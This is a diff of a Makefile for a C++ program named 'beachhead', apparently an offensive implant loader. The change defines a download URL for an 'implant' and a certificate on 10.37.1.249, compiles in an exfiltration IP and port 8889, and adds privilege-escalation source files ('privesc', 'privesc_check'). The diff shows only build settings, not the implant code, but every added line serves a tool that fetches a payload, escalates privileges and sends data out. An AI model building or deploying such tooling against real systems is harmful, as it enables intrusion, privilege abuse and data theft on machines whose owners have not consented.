@@ -1,17 +1,21 @@
-# Change this to your url
-URL ?= "http://10.37.1.249/implant.py"
+URL ?= http://10.37.1.249/implant
+CERT_URL = http://10.37.1.249/cert.pem
 
-# Compiler and flags for c++
 CXX = g++
-CXXFLAGS = -O2 -s -DURL='$(URL)'
+CXXFLAGS = -O2 -s \
+           -DURL='"$(URL)"' \
+           -DCERT_URL='"$(CERT_URL)"' \
+           -DEXFIL_IP='"10.37.1.249"' \
+           -DEXFIL_PORT=8889
+LDFLAGS = -lssl -lcrypto
 
 TARGET = beachhead
-SRC = beachhead.cpp 
+SRC = beachhead.cpp privesc_check.cpp privesc.cpp privesc_check.h privesc.h
 
 all: $(TARGET)
 
 $(TARGET): $(SRC)
-	$(CXX) $(CXXFLAGS) -o $(TARGET) $(SRC)
+	$(CXX) $(CXXFLAGS) -o $(TARGET) $(SRC) $(LDFLAGS)
 
 clean:
 	rm -f $(TARGET)
